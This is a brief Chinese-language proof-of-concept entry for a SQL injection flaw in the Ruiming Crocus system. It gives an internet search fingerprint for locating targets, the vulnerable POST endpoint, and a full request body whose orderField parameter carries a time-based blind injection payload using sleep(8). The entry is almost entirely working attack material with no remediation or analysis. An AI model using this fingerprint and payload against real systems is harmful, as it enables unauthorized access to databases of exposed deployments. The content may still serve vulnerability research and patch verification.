# 锐明Crocus系统存在SQL注入漏洞

锐明Crocus系统 ｜ SQL注入 ｜ —
- **指纹**：`body="inp_verification"`
- **请求**：`POST /RepairRecord.do?Action=QueryLast HTTP/1.1`

**Payload**
```
EndTime=2024-06-19+23%3A59%3A59&FaultType=&Field=&GroupId=&PageIndex=0&PageSize=50&RepairState=-1&StartTime=2024-06-19+00%3A00%3A00&UserName=&Value=&VehicleId=&orderField=(select*from(select%0asleep(8))a)&orderType=asc
```
- **响应特征**：200